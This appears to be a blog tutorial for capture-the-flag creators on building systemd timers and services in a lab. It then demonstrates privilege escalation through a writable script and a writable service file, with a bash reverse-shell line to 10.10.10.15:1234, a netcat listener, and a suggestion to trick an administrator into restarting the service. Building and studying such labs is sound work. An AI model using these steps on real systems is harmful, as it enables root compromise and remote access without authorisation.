---
title: Linux Privilege Escalation - Timers for CTF Creators
draft: false
author: "pwnlog"
authorLink: ""
description: ""
license: ""
images: []
date: 2021-12-28 11:33:00 +0800
categories: [Linux Privilege Escalation]
tags: [privilege escalation, timers, systemd.timers, writable timers, writable executables, defend]

hiddenFromHomePage: false
hiddenFromSearch: false
twemoji: false
lightgallery: true
ruby: true
fraction: true
fontawesome: true
linkToMarkdown: false
rssFullText: false

code:
  copy: true
  maxShownLines: -1
  # ...
math:
  enable: true
  # ...
mapbox:
  accessToken: ""
  # ...
share:
  enable: true
  # ...
comment:
  enable: true
  # ...
library:
  css:
    # someCSS = "some.css"
    # located in "assets/"
    # Or
    # someCSS = "https://cdn.example.com/some.css"
  js:
    # someJS = "some.js"
    # located in "assets/"
    # Or
    # someJS = "https://cdn.example.com/some.js"
seo:
  images: []
  # ...

summary: "Timing sometimes works right? \\/(\\*<\\*)\\/"
---

# Timers

Timers are services that perform scheduled tasks at specific time intervals. These could have wrong permissions or could relative paths that could be hijacked.

Timers can be enumerated with the following command:

```shell
systemctl list-timers --all
```

## Systemd Timers Man Page

The manual page of the systemd.timer is the following:

```shell
man systemd.timer
```

You can see a table that defines each setting, read it at your own pace if you want to:

```shell
│Setting            │ Meaning                                                      │
├───────────────────┼──────────────────────────────────────────────────────────────┤
│OnActiveSec=       │ Defines a timer relative to the moment the timer unit itself │
│                   │ is activated.                                                │
├───────────────────┼──────────────────────────────────────────────────────────────┤
│OnBootSec=         │ Defines a timer relative to when the machine was booted up.  │
│                   │ In containers, for the system manager instance, this is      │
│                   │ mapped to OnStartupSec=, making both equivalent.             │
├───────────────────┼──────────────────────────────────────────────────────────────┤
│OnStartupSec=      │ Defines a timer relative to when the service manager was     │
│                   │ first started. For system timer units this is very similar   │
│                   │ to OnBootSec= as the system service manager is generally     │
│                   │ started very early at boot. It's primarily useful when       │
│                   │ configured in units running in the per-user service manager, │
│                   │ as the user service manager is generally started on first    │
│                   │ login only, not already during boot.                         │
├───────────────────┼──────────────────────────────────────────────────────────────┤
│OnUnitActiveSec=   │ Defines a timer relative to when the unit the timer unit is  │
│                   │ activating was last activated.                               │
├───────────────────┼──────────────────────────────────────────────────────────────┤
│OnUnitInactiveSec= │ Defines a timer relative to when the unit the timer unit is  │
│                   │ activating was last deactivated.                             │
└───────────────────┴──────────────────────────────────────
```

## Timers Schedule

OnCalendar= Defines real-time (i.e. wallclock) timers with calendar event expressions.

```txt
minutely → *-*-* *:*:00

hourly → *-*-* *:00:00

daily → *-*-* 00:00:00

monthly → *-*-01 00:00:00

weekly → Mon *-*-* 00:00:00

yearly → *-01-01 00:00:00

quarterly → *-01,04,07,10-01 00:00:00

semiannually → *-01,07-01 00:00:00
```

# Creating a Utility

Create a script:

```shell
sudo vim /opt/myscript.sh
```

Go into insert mode and write the following code, which prints the date and adds it to the file `file.log`:

```shell
#!/bin/bash

echo "The date is: $(date)" >> /home/low/Documents/file.log
```

Add execution permissions to the script:

```shell
sudo chmod +x /opt/myscript.sh 
ls -l /opt/myscript.sh 
-rwxr-xr-x 1 root root 75 Nov  5 22:32 /opt/myscript.sh
```

Run the script and check the `file.log` file:

```shell
/opt/myscript.sh

ls -l ~/Documents/
total 4
-rw-rw-r-- 1 user user 45 Nov  5 22:32 file.log
```

Read the file:

```shell
cat ~/Documents/file.log 
```

We can see the date.

# Creating a Service

Create a service:

```shell
sudo vim /etc/systemd/system/myscript.service
```

Go into insert mode and add the following instructions to run the script `myscript.sh` as the root user.

```shell
[Unit]
Description=My custom script

[Service]
Type=simple
ExecStart=/opt/myscript.sh
User=root # the user that will execute the service

[Install]
WantedBy=multi-user.target
WantedBy=gr
```

Now reload the daemon and start the `myscript.service` service:

```shell
sudo systemctl daemon-reload
sudo systemctl start myscript.service
```

Check the status:

```shell
sudo systemctl status myscript.service
```

# Analyze Timers

Analyze the timer (this command is not available in Ubuntu 16.04):

```shell
systemd-analyze calendar "Thu *-*-* 17:00:00"
```

# Creating a Timer

Now create a timer:

```shell
sudo vim /etc/systemd/system/myscript.timer
```

Add the following instructions:

```shell
[Unit]
Description=My custom script

[Timer]
Unit=myscript.service
OnBootSec=5min # 5 minutes after the system boots
OnUnitActiveSec=15min # Run every 15 minutes after the OnBootSec
OnCalendar=Thu *-*-* 17:00:00   # DayOfWeek Year-Month-Day Hour:Minute:Second
Persistent=true # If the computer was turned off and you turn it on, it will run the service. This means that is persistent with reboots.

[Install]
WantedBy=timers.target # Is a target that starts up during boot automatically
WantedBy=graphical.target # Start the timer when the GUI starts
```

# Manage a Timer

Enable a timer:

```shell
user@pwn:~/Desktop$ sudo systemctl daemon-reload
user@pwn:~/Desktop$ sudo systemctl status myscript.timer
● myscript.timer - My custom script
     Loaded: loaded (/etc/systemd/system/myscript.timer; disabled; vendor preset: enable>
     Active: inactive (dead)
    Trigger: n/a
   Triggers: ● myscript.service
user@pwn:~/Desktop$ sudo systemctl enable myscript.timer
Created symlink /etc/systemd/system/timers.target.wants/myscript.timer → /etc/systemd/system/myscript.timer.
```

Start a timer:

```shell
sudo systemctl start myscript.timer
```

Check the status:

```shell
user@pwn:~/Desktop$ sudo systemctl status myscript.timer
● myscript.timer - My custom script
     Loaded: loaded (/etc/systemd/system/myscript.timer; enabled; vendor preset: enabled)
     Active: active (waiting) since Fri 2021-11-05 22:50:46 PDT; 40s ago
    Trigger: Fri 2021-11-05 22:52:00 PDT; 33s left
   Triggers: ● myscript.service

Nov 05 22:50:46 ubuntu systemd[1]: Started My custom script.
```

Look at the trigger to see how much time is left:

```shell
Trigger: Fri 2021-11-05 22:52:00 PDT; 33s left
```

List all the timers:

```shell
user@pwn:~/Desktop$ systemctl list-timers --all | grep myscript.timer
n/a                         n/a           Fri 2021-11-05 23:02:00 PDT 3min 15s ago       myscript.timer               myscript.service    
```

File timer and service permissions:

```shell
user@pwn:~/Desktop$ ls -la /etc/systemd/system/myscript.timer
-rw-r--r-- 1 root root 125 Nov  5 22:48 /etc/systemd/system/myscript.timer
user@pwn:~/Desktop$ ls -la /etc/systemd/system/myscript.service
-rw-r--r-- 1 root root 97 Nov  5 22:35 /etc/systemd/system/myscript.service
```

# Privilege Escalation via Writable Executable

Add writable permissions to the script:

```shell
sudo chmod o+w /opt/elevate.sh
```

If the script that's being run by the service is writable, we can just write something malicious to the script like adding a reverse shell code:

```shell
user@pwn:~/Desktop$ echo 'bash -i >& /dev/tcp/10.10.10.15/1234 0>&1' >> /opt/elevate.sh
```

To make this work, we need to restart the service. However, if we are in a session with a user who lacks the necessary capabilities or permissions to restart the service, we have a few options: we can either reboot the system, wait for an opportunity, or persuade the system administrator to restart the service for us. Then we could receive the reverse shell:

```shell
nc -lvnp 1234
```

# Privilege Escalation via Writable Timer

A misconfiguration of this is when others have write permissions to the service configuration file:

```shell
sudo chmod o+w /etc/systemd/system/elevate.service
```

We'll then verify the permissions to confirm that the `others` group is writable:

```shell
ls -l /etc/systemd/system/elevate.service
-rwxr-xrwx 1 root root 96 Nov  5 23:16 /etc/systemd/system/elevate.service
```

We'll create a simple payload:

```shell
echo -e '#!/bin/bash\n\nbash -i >& /dev/tcp/10.10.10.15/1234 0>&1' >> /home/user/evil.sh
```

Then we could edit the service configuration file:

```shell
user@pwn:~/Desktop$ vim /etc/systemd/system/elevate.service
[Unit]
Description=Elevate Script

[Service]
Type=simple
ExecStart=/home/user/evil.sh
User=root
```

Afterwards, we'll need to reload the daemon to apply the changes, in the case of the adversary being a user privileged who doesn't have capabilities or permissions to reset the daemon, then we must wait or trick the administrator into reloading the daemon, alternatively, we may be able to reboot the system:

```shell
sudo systemctl daemon-reload
```

The timer can be monitored with the following command:

```shell
watch -n 1 sudo systemctl status elevate.timer
```

Then we may receive the reverse shell:

```shell
nc -lvnp 1234
```
